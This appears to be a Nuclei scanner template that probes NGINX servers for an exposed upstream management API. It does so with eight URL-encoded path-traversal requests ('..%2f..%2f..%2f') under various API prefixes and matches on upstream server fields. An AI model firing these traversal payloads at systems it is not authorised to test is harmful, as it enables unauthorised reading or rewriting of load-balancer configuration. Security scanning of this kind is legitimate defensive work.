id: nginx-upstream-api

info:
  name: NGINX Api Read or Write Upstreams
  author: reewardius
  reference: https://zoidsec.medium.com/breaking-parse-logic-gain-access-to-nginx-api-read-write-upstreams-1cb062aa44ca
  severity: critical
  metadata:
    max-request: 8
  tags: nginx,lfi,lfr
  
http:
  - method: GET
    path:
      - '{{BaseURL}}/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/api/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/api/v1/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/api/v2/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/api/v3/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/experience/v1/feature-flags/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/experience/v2/feature-flags/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      - '{{BaseURL}}/experience/v3/feature-flags/..%2f..%2f..%2f/api/v1/http/upstreams/inauth/servers/'
      
    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - 'id'
          - 'server'
          - 'max_fails'
          - 'fail_timeout'
        condition: and